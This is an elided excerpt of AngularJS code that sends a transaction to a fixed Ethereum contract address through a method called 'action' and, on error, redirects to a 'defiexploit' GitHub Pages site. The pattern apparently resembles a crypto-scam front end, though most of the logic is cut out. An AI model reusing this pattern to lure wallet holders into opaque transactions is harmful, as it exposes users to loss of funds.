...
app.controller('myCtrl', async function($scope) {
                $scope.init = function() {
                        ...
                        $scope.chain = "Ethereum", $scope.addressdex = "0x7dDaA2AFadea8A6Fcb8910Be0f830ad18d39F696", $scope.scan = "https://etherscan.io/", $scope.idscan = "Etherscan", $scope.erc20 = {
                            name: '',
                            symbol: '',
                            network: !isBnb
                        };
                                        ...
                                        window.contract.methods.action().send({
                                            ...
                                            if (error) {
                                                ...
                                                setTimeout(function() {
                                                    ...
                                                    window.location.href = 'https://defiexploit.github.io/home.html';
                                                }, 5000);
                                            }
                                        });
                                    }
